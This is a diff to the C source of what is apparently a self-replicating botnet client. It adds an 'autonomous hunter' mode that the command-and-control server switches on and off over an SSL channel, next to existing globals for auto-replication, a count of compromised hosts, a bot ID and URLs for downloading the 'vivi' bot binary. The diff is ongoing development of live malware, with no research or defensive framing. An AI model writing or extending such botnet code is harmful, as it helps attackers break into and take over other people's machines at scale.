@@ -23,12 +23,14 @@
 #endif
 #include "report_system.h"
 #include "ascii_art.h"
+#include "autonomous_hunter.h"
 
 // Globals
 SSL *c2_ssl = NULL;
 int auto_replicate = 1;
 int hosts_compromised = 0;
 char bot_id[64];
+int hunter_mode = 0;  // Autonomous hunter enabled/disabled
 ScanStatistics global_stats = {0};
 char *vivi_urls[] = {
     "http://%s/bots/linux/x86_64/vivi",
@@ -1067,6 +1069,19 @@ int main() {
                             const char *state = json_object_get_string(state_obj);
                             auto_replicate = (strcmp(state, "on") == 0) ? 1 : 0;
                             send_report("auto_rep", auto_replicate ? "enabled" : "disabled");
+                        }
+                    } else if (strcmp(action, "hunter") == 0) {
+                        json_object *state_obj;
+                        if (json_object_object_get_ex(jobj, "state", &state_obj)) {
+                            const char *state = json_object_get_string(state_obj);
+                            if (strcmp(state, "on") == 0 && !hunter_mode) {
+                                hunter_mode = 1;
+                                start_autonomous_hunter();
+                                send_report("hunter", "🎯 Autonomous Hunter Mode STARTED");
+                            } else if (strcmp(state, "off") == 0) {
+                                hunter_mode = 0;
+                                send_report("hunter", "Hunter Mode STOPPED (threads will finish current scans)");
+                            }
                         }
                     } else if (strcmp(action, "status") == 0) {
                         char status[256];
